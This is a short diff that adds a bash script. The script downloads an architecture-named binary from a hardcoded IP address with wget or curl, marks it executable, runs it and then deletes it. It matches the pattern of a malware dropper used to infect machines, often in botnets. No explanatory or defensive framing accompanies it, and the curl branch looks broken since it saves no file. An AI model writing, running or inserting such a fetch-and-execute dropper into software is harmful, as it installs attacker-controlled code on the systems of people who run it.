@@ -1,0 +1,10 @@
+#!/bin/bash
+if [ -e /usr/bin/wget ]; then
+    wget http://18.188.207.128/$(uname -m); chmod +x $(uname -m); ./$(uname -m) $(uname -m); rm -rf $(uname -m)
+    exit 1
+elif [ -e /usr/bin/curl ]; then
+    curl http://18.188.207.128/$(uname -m); chmod +x $(uname -m); ./$(uname -m) $(uname -m); rm -rf $(uname -m)
+    exit 1
+else
+    echo "wget or curl not found"
+fi
